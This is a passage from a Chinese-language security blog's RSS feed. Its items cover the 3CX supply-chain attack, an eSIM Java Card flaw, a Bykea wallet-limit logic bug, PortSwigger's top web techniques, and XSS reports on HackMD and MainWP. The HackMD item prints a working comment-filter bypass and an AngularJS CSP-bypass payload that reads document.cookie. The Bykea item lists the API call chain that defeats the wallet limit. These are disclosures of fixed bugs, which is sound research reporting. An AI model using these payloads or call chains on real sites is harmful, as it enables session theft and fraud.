&lt;/h3&gt;&lt;p&gt;3CX首席信息安全官Pierre Jourdan在3月30日的博客中表示，其Electron Windows应用的多个版本因恶意代码受到影响，这些代码源自&amp;quot;某高级持续性威胁（APT）组织（可能受国家支持）发起的针对性供应链攻击&amp;quot;。Jourdan提到，攻击可能通过&amp;quot;通过GIT打包到Windows Electron应用中的某个库&amp;quot;实现。CEO Nick Galea在同日的论坛发文中称，此次攻击因&amp;quot;使用的上游库被感染&amp;quot;引发。&lt;/p&gt;
&lt;p&gt;安全厂商SentinelOne和CrowdStrike的初期报告指出，感染核心文件为&amp;quot;ffmpeg.dll&amp;quot;（引用多媒体框架FFmpeg）。对此，FFmpeg通过推特回应称其开源项目仅处理源代码而非编译文件。3CX随后似乎撤回了&amp;quot;上游库&amp;quot;相关声明。&lt;/p&gt;
&lt;p&gt;CrowdStrike 3月29日的研究博客显示，此次攻击部分特征与朝鲜Lazarus组织3月初的另一起网络攻击一致。卡巴斯基实验室的博客则将该活动与针对加密货币公司的攻击相关联。&lt;/p&gt;
&lt;p&gt;TechTarget编辑Rob Wright和Alex Culafi在本期《Risk &amp;amp; Repeat》播客中探讨了3CX事件及供应链攻击的整体威胁态势。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>安全专家揭秘：汽车、家居和医疗设备的SMART服务为何如此易被入侵？</title>
        <link>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E4%B8%93%E5%AE%B6%E6%8F%AD%E7%A7%98%E6%B1%BD%E8%BD%A6%E5%AE%B6%E5%B1%85%E5%92%8C%E5%8C%BB%E7%96%97%E8%AE%BE%E5%A4%87%E7%9A%84smart%E6%9C%8D%E5%8A%A1%E4%B8%BA%E4%BD%95%E5%A6%82%E6%AD%A4%E6%98%93%E8%A2%AB%E5%85%A5%E4%BE%B5/</link>
        <pubDate>Thu, 07 Aug 2025 14:28:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E4%B8%93%E5%AE%B6%E6%8F%AD%E7%A7%98%E6%B1%BD%E8%BD%A6%E5%AE%B6%E5%B1%85%E5%92%8C%E5%8C%BB%E7%96%97%E8%AE%BE%E5%A4%87%E7%9A%84smart%E6%9C%8D%E5%8A%A1%E4%B8%BA%E4%BD%95%E5%A6%82%E6%AD%A4%E6%98%93%E8%A2%AB%E5%85%A5%E4%BE%B5/</guid>
        <description>&lt;h3 id=&#34;黑客如何轻松攻破汽车家居和医疗设备的smart服务&#34;&gt;黑客如何轻松攻破汽车、家居和医疗设备的SMART服务？
&lt;/h3&gt;&lt;p&gt;企业正在通过将传统服务数字化改造来重塑自身。数字化服务利用智能产品提供更优质的服务体验、附加功能以及用于性能优化的数据采集。这些智能产品可通过Wi-Fi/蜂窝网络、传感器、云端基础设施和移动端进行远程控制，涵盖联网汽车、家用电器、监控系统、可穿戴设备、医疗仪器甚至智能步枪等领域。近期白帽黑客就利用软件漏洞成功劫持了行驶中的Jeep Cherokee，使其失控冲入沟渠——而驾驶员全程束手无策！&lt;/p&gt;
&lt;h4 id=&#34;安全与物理伤害的界限正在模糊&#34;&gt;安全与物理伤害的界限正在模糊
&lt;/h4&gt;&lt;p&gt;虽然这次汽车黑客事件导致140万辆汽车召回，但它更标志着网络攻击开始能对人身安全造成实质伤害。未来的网络攻击将不再局限于数据泄露、金融窃取或隐私窥探，而是可能通过定向或随机方式致人伤残甚至死亡——这一切可能就发生在受害者家中。&lt;/p&gt;
&lt;h4 id=&#34;物理接触攻击的隐蔽威胁&#34;&gt;物理接触攻击的隐蔽威胁
&lt;/h4&gt;&lt;p&gt;部分漏洞利用技术被低估的原因在于需要物理接触设备。但车辆维修或代泊期间，攻击者完全可能篡改电子系统乃至固件。所有智能设备都将支持无线更新，这为黑客提供了绝佳的攻击入口。因此数字产品必须建立双重防御体系：既要防范无线入侵，也要防范技术人员等内部人员的物理接触攻击。&lt;/p&gt;
&lt;h4 id=&#34;初创企业的安全困境&#34;&gt;初创企业的安全困境
&lt;/h4&gt;&lt;p&gt;资金有限的初创企业往往难以提供充分的安全防护，这为恶意攻击者提供了可乘之机。智能产品安全投资的驱动力将主要来自安全法规、合规要求及严厉的惩罚性条款。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>数亿手机存在eSIM漏洞，可导致监控与设备劫持</title>
        <link>http://localhost:1313/p/%E6%95%B0%E4%BA%BF%E6%89%8B%E6%9C%BA%E5%AD%98%E5%9C%A8esim%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E7%9B%91%E6%8E%A7%E4%B8%8E%E8%AE%BE%E5%A4%87%E5%8A%AB%E6%8C%81/</link>
        <pubDate>Thu, 07 Aug 2025 08:33:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%95%B0%E4%BA%BF%E6%89%8B%E6%9C%BA%E5%AD%98%E5%9C%A8esim%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E7%9B%91%E6%8E%A7%E4%B8%8E%E8%AE%BE%E5%A4%87%E5%8A%AB%E6%8C%81/</guid>
        <description>&lt;h1 id=&#34;esim漏洞使数亿手机面临监控与劫持风险&#34;&gt;eSIM漏洞使数亿手机面临监控与劫持风险
&lt;/h1&gt;&lt;p&gt;全球范围内的eSIM卡可能因Oracle技术中一个存在6年的漏洞而面临物理和网络攻击的根本性威胁，该技术支撑着数十亿张SIM卡。&lt;/p&gt;
&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情
&lt;/h2&gt;&lt;p&gt;嵌入式用户身份模块(eSIM)的系统性漏洞已使数十亿设备面临监控、SIM卡交换等威胁。与传统SIM卡不同，eSIM允许单个设备存在多个运营商订阅，且无法物理移除替换。&lt;/p&gt;
&lt;p&gt;安全公司Security Explorations创始人Adam Gowdiak发现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用Kigen嵌入式通用集成电路卡(eUICC)中的漏洞&lt;/li&gt;
&lt;li&gt;攻击者可窃取eSIM与移动网络运营商(MNO)认证的私密加密密钥&lt;/li&gt;
&lt;li&gt;能以明文下载运营商eSIM配置文件&lt;/li&gt;
&lt;li&gt;通过未经验证的Java Card字节码安装恶意小程序(OTA)&lt;/li&gt;
&lt;li&gt;整个过程不会触发任何安全警报&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术根源&#34;&gt;技术根源
&lt;/h2&gt;&lt;p&gt;漏洞源于Oracle &amp;ldquo;Java Card&amp;quot;虚拟机(VM)实现中缺乏字节码验证导致的&amp;quot;类型混淆&amp;quot;问题。Java Card是运行在资源受限设备芯片上的应用环境，每年约有60亿台启用Java Card的设备诞生。&lt;/p&gt;
&lt;p&gt;尽管2019年就报告该漏洞，Oracle当时认为&amp;quot;不适用&amp;quot;而未修复。Gowdiak表示：&amp;ldquo;Kigen开发了自己的JavaCard VM，结果证明存在漏洞。考虑到所有eSIM都需要支持JavaCard（根据GSMA规范要求），我倾向于认为所有eSIM都受影响。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CVSS评分：6.7（中危）&lt;/li&gt;
&lt;li&gt;受影响产品：Kigen eSIM OS ECu10.13（面向开发的特定变体）&lt;/li&gt;
&lt;li&gt;补丁情况：Kigen已发布安全公告和OTA补丁，并强化操作系统对未验证字节码的防护&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;攻击场景&#34;&gt;攻击场景
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;国家级威胁&lt;/strong&gt;：可植入持久化恶意小程序，实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设备变砖&lt;/li&gt;
&lt;li&gt;克隆eSIM接收受害者短信/电话&lt;/li&gt;
&lt;li&gt;拦截双因素认证(2FA)代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;运营商数据窃取&lt;/strong&gt;：通过模拟eSIM与运营商服务器通信&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;多配置文件攻击&lt;/strong&gt;：例如在中国安装次级eSIM配置文件时，可能泄露主运营商（如AT&amp;amp;T）密钥&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Gowdiak警告：&amp;ldquo;一个恶意eSIM配置文件可能破坏芯片安全，影响该芯片上属于其他运营商的所有配置文件。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;本文更新于2025年7月11日上午9:30，补充了Kigen发言人评论&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>绕过青铜合作伙伴钱包限制：利用业务逻辑漏洞接受负余额行程</title>
        <link>http://localhost:1313/p/%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E5%88%A9%E7%94%A8%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B/</link>
        <pubDate>Thu, 07 Aug 2025 06:45:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E5%88%A9%E7%94%A8%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B/</guid>
        <description>&lt;h3 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h3&gt;&lt;p&gt;安全研究员@bugbountywithmarco发现Bykea平台存在业务逻辑缺陷，允许钱包余额为负的青铜级合作伙伴绕过平台限制接受行程订单。通过串联调用三个后端API端点，负余额司机可重置其可用状态并成功提交报价。&lt;/p&gt;
&lt;h3 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h3&gt;&lt;p&gt;攻击链涉及以下端点调用序列：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先调用&lt;code&gt;GET /v2/:city_id/bookings&lt;/code&gt;获取行程列表&lt;/li&gt;
&lt;li&gt;随后调用&lt;code&gt;PUT /api/v2/driver/update/location&lt;/code&gt;（携带任意trip_id参数）&lt;/li&gt;
&lt;li&gt;最后通过&lt;code&gt;POST /api/v2/offer/bid&lt;/code&gt;提交报价&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种调用方式会绕过平台对负余额账户的常规限制检查，使不符合条件的司机能够非法接受行程订单。&lt;/p&gt;
&lt;h3 id=&#34;时间线&#34;&gt;时间线
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;2024年11月27日：漏洞初次报告&lt;/li&gt;
&lt;li&gt;2024年11月28日：漏洞被分类为中等风险(6.5分)&lt;/li&gt;
&lt;li&gt;2025年3月27日：问题修复&lt;/li&gt;
&lt;li&gt;2025年6月13日：漏洞报告公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞分类&#34;&gt;漏洞分类
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;弱点类型：业务逻辑错误(Business Logic Errors)&lt;/li&gt;
&lt;li&gt;CVE编号：无&lt;/li&gt;
&lt;li&gt;风险等级：中等(6.5)&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>2023年十大Web黑客技术盘点 | PortSwigger研究</title>
        <link>http://localhost:1313/p/2023%E5%B9%B4%E5%8D%81%E5%A4%A7web%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E7%9B%98%E7%82%B9-portswigger%E7%A0%94%E7%A9%B6/</link>
        <pubDate>Thu, 07 Aug 2025 03:36:08 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2023%E5%B9%B4%E5%8D%81%E5%A4%A7web%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E7%9B%98%E7%82%B9-portswigger%E7%A0%94%E7%A9%B6/</guid>
        <description>&lt;h1 id=&#34;2023年十大web黑客技术盘点&#34;&gt;2023年十大Web黑客技术盘点
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;欢迎阅读《2023年十大Web黑客技术》第17版，这是我们年度社区驱动的研究成果展示，旨在识别过去一年中最具创新性的Web安全研究。&lt;/p&gt;
&lt;p&gt;今年社区创纪录地提交了68项提名，经过投票选出15项决赛作品。由Nicolas Grégoire、Soroush Dalili、Filedescriptor和我组成的专家小组经过两周分析，最终评选出2023年十大Web黑客技术！&lt;/p&gt;
&lt;h2 id=&#34;技术榜单&#34;&gt;技术榜单
&lt;/h2&gt;&lt;h3 id=&#34;10-根epp服务器攻击接管域名控制权&#34;&gt;10. 根EPP服务器攻击：接管域名控制权
&lt;/h3&gt;&lt;p&gt;Sam Curry团队揭示了关键互联网基础设施的脆弱性，展示了通过多层间接路径实现控制的经典案例。&lt;/p&gt;
&lt;h3 id=&#34;9-cookie瓦解web会话完整性的攻防&#34;&gt;9. Cookie瓦解：Web会话完整性的攻防
&lt;/h3&gt;&lt;p&gt;Marco Squarcina等人深入剖析Web Cookie安全现状，特别展示了CSRF令牌固定攻击对Symfony等PHP框架的影响。&lt;/p&gt;
&lt;h3 id=&#34;8-从akamai到f5再到ntlm&#34;&gt;8. 从Akamai到F5再到NTLM&amp;hellip;
&lt;/h3&gt;&lt;p&gt;D3d的deadvolvo通过HTTP异步攻击研究，揭示了该漏洞类在当今互联网的持续影响，同时探讨了漏洞赏金机制的矛盾。&lt;/p&gt;
&lt;h3 id=&#34;7-我是如何黑掉microsoft-teams并获得15万美元赏金&#34;&gt;7. 我是如何黑掉Microsoft Teams并获得15万美元赏金
&lt;/h3&gt;&lt;p&gt;Masato Kinugawa详细呈现了价值15万美元的漏洞利用链开发过程，为Electron应用安全研究提供了创新方法论。&lt;/p&gt;
&lt;h3 id=&#34;6-http请求拆分漏洞利用&#34;&gt;6. HTTP请求拆分漏洞利用
&lt;/h3&gt;&lt;p&gt;Sergey Bobrov通过nginx案例研究，展示了这种本不该存在的漏洞如何成为攻击者的高价值目标。&lt;/p&gt;
&lt;h3 id=&#34;5-利用http解析器不一致性&#34;&gt;5. 利用HTTP解析器不一致性
&lt;/h3&gt;&lt;p&gt;Rafael da Costa Santos重新应用解析器混淆技术，发现ACL绕过、SSRF、缓存污染等多类漏洞。&lt;/p&gt;
&lt;h3 id=&#34;4-php过滤器链基于错误预言机的文件读取&#34;&gt;4. PHP过滤器链：基于错误预言机的文件读取
&lt;/h3&gt;&lt;p&gt;Rémi Matasse优化了hash_kitten提出的创新技术，通过PHP过滤器触发内存异常来实现文件内容泄露。&lt;/p&gt;
&lt;h3 id=&#34;3-smtp走私全球邮件伪造&#34;&gt;3. SMTP走私：全球邮件伪造
&lt;/h3&gt;&lt;p&gt;Timo Longin将HTTP请求走私技术移植到SMTP协议，展示了针对主流邮件软件的髙影响案例研究。&lt;/p&gt;
&lt;h3 id=&#34;2-强化版net反序列化漏洞利用&#34;&gt;2. 强化版.NET反序列化漏洞利用
&lt;/h3&gt;&lt;p&gt;Piotr Bazydło的100页研究报告彻底解构了反序列化防护机制，特别展示了CredentialInitializer等精巧gadget的利用。&lt;/p&gt;
&lt;h3 id=&#34;1-粉碎状态机web竞态条件的真正潜力&#34;&gt;1. 粉碎状态机：Web竞态条件的真正潜力
&lt;/h3&gt;&lt;p&gt;James Kettle重新定义了竞态条件攻击范式，通过多阶段攻击链和新型HTTP栈利用技术实现突破性进展。&lt;/p&gt;
&lt;h2 id=&#34;结语&#34;&gt;结语
&lt;/h2&gt;&lt;p&gt;2023年安全社区产出了大量优质研究。这些技术因其长期影响力入选，建议安全从业者同时查阅历年榜单。如需获取最新研究动态，可订阅我们的RSS或关注社交媒体。&lt;/p&gt;
&lt;p&gt;特别感谢所有参与提名、投票和研究的社区成员！我们2024年再见。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>HackMD上的可蠕虫化XSS漏洞分析与利用</title>
        <link>http://localhost:1313/p/hackmd%E4%B8%8A%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
        <pubDate>Wed, 06 Aug 2025 13:58:10 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hackmd%E4%B8%8A%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;h1 id=&#34;hackmd上的可蠕虫化xss漏洞&#34;&gt;HackMD上的可蠕虫化XSS漏洞
&lt;/h1&gt;&lt;p&gt;在Web安全领域，我通常更偏爱服务器端漏洞而非客户端漏洞（当然能直接获取shell的客户端漏洞除外XD）。但这次发现的XSS漏洞确实有些特别，因此决定分享这个有趣的发现。&lt;/p&gt;
&lt;h2 id=&#34;漏洞背景&#34;&gt;漏洞背景
&lt;/h2&gt;&lt;p&gt;HackMD是一款由台湾开发者打造的Markdown协作平台，被COSCUP、g0v、HITCON等知名研讨会用作官方共笔平台，甚至还是Ethereum的协作平台。其开源代码在GitHub上获得了4500多颗星。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因&#34;&gt;漏洞成因
&lt;/h2&gt;&lt;p&gt;漏洞位于HackMD前端渲染Markdown时的XSS防御机制中。平台使用npm/xss库进行防护，但在处理HTML注释标签时存在缺陷：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;onIgnoreTag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!--&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 不过滤注释属性
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过构造特殊注释标签可绕过过滤：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;bar--&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Hi&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&amp;#34; --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;csp绕过&#34;&gt;CSP绕过
&lt;/h2&gt;&lt;p&gt;HackMD实施了严格的内容安全策略(CSP)，但允许加载cdnjs.cloudflare.com的脚本。利用AngularJS库可以轻松绕过：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;--&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;ng-app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{constructor.constructor(&amp;#39;alert(document.cookie)&amp;#39;)()}}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//sssss&amp;#34; --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
&lt;/h2&gt;&lt;p&gt;当攻击者与受害者同时编辑同一份文档时，可对所有查看者实施攻击。该漏洞已在最新版CodiMD中修复。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>MainWP成本跟踪器笔记字段中的反射型XSS漏洞分析</title>
        <link>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 13:25:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;反射型xss在成本跟踪器笔记字段中的漏洞报告&#34;&gt;反射型XSS在&amp;quot;成本跟踪器&amp;quot;笔记字段中的漏洞报告
&lt;/h1&gt;&lt;h2 id=&#34;漏洞描述&#34;&gt;漏洞描述
&lt;/h2&gt;&lt;p&gt;在MainWP客户端管理面板的&amp;quot;成本跟踪器&amp;quot;模块中，当用户添加或编辑成本时，可以在笔记字段输入任意内容。由于缺乏适当的输入净化和输出编码，如果该输入包含恶意JavaScript（例如XSS有效载荷），将在保存后立即被反射并执行。&lt;/p&gt;
&lt;p&gt;该脚本不会永久存储在系统中，这证实了它是一个反射型XSS，在当前会话提交后立即触发。&lt;/p&gt;
&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
&lt;/h2&gt;&lt;p&gt;该漏洞的存在表明用户输入在反射回HTML响应之前没有经过适当的净化或编码处理。虽然其他用户无法直接利用此漏洞，但可能带来以下影响：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果应用程序其他部分存在类似的输入处理方式，这可能成为更严重XSS漏洞的潜在入口点&lt;/li&gt;
&lt;li&gt;在浏览器扩展、调试工具或集成第三方脚本的环境中，会带来客户端安全风险&lt;/li&gt;
&lt;li&gt;降低了用户对平台安全编码实践的信任度，特别是在管理多个WordPress站点的管理界面中&lt;/li&gt;
&lt;li&gt;攻击者可通过访问仪表板（如内部威胁或低权限用户被入侵）来测试或探索更多有效载荷注入点&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;修复过程&#34;&gt;修复过程
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2025年6月10日&lt;/strong&gt;：漏洞报告提交&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;同日11:39&lt;/strong&gt;：MainWP团队确认漏洞并标记为&amp;quot;已分类&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;同日16:05&lt;/strong&gt;：MainWP团队发布补丁版本mainwp.zip&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;6月11日&lt;/strong&gt;：研究人员反馈补丁未完全修复问题&lt;/li&gt;
